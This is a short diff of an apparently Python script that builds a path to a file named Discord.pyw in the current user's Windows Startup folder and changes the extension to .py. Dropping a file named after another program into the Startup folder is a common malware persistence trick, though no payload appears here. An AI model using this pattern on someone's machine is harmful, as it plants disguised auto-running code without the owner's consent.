@@ -5,7 +5,7 @@ import psutil
 import time
 import shutil
 name = os.environ.get("USERNAME")
-path = r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Discord.pyw".format(name)
+path = r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Discord.py".format(name)
 whiteChars = list('@')
 logo = """
 
